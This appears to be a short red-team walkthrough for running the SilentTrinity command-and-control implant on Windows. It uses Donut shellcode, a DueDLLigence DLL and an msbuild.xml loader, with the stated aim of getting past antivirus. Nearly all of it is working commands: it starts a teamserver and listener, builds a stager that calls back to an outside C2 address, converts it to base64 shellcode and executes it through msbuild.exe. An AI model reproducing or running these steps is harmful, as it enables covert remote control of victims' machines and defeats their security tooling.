We will use DLLDiligence and Donut shellcode to load SilentTrinity.

To start teamserver:

```
cd /testing/SILENTTRINITY/
tmux
pipenv shell
python3 teamserver.py 192.168.254.136 test1234
```

Create a new tab using `CTRL + b > "`

To start the client:
```
pipenv shell
python3 st.py wss://thewover:test1234@192.168.254.136:5000
```

Start a listener and generate an exe stager:

```
listeners
use http
start
sessions
register
```

Copy the GUID and PSK. Those go into the stager.exe in the following format.
```
.\stager.exe 7bad81ea-d55e-465e-943c-fca48a762f1b 209a0bded4903236f74e94c5c3d823e0abee462c7bc1a5c237444a8ca52fced6 http://192.168.254.136
```

First, COPY the SilentTrinity stager EXE to the Desktop to try to run it. To show that it would normally get picked up by AV. Then use the DueDLLigence DLL to load it via Donut Shellcode.

```
.\donut.exe -f .\stager.exe -p "6cfd0ebe-8983-43d8-9fba-65666767f0eb d49759fdf977093c86fddb30ead4a8be9bed76de49339b11288422e53f3c0d53 http://192.168.254.136"
```

Copy the shellcode to clipboard as base64. Drop into the msbuild.xml file.

```powershell
$filename = "C:\\..."
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
```

Run the msbuild file with:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe .\msbuild.xml
```